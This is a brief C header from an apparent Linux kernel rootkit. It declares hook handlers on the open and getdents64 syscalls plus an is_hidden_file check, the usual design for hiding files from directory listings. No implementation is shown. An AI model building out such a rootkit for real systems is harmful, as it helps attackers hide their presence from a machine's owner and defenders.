#include "rootkit_cmd.h"
#include <linux/module.h>

bool is_hidden_file(const char *str);

void open_syscall_enter_handler(char *__user filename, struct rootkit_cmd *cmd);

void open_syscall_exit_handler(struct pt_regs *syscall_regs,
                               struct rootkit_cmd cmd);

void getdents64_syscall_enter_handler(unsigned int buf_size,
                                      struct linux_dirent64 *__user dirents,
                                      struct rootkit_cmd *cmd);

void getdents64_syscall_exit_handler(struct pt_regs *regs,
                                     struct rootkit_cmd cmd);
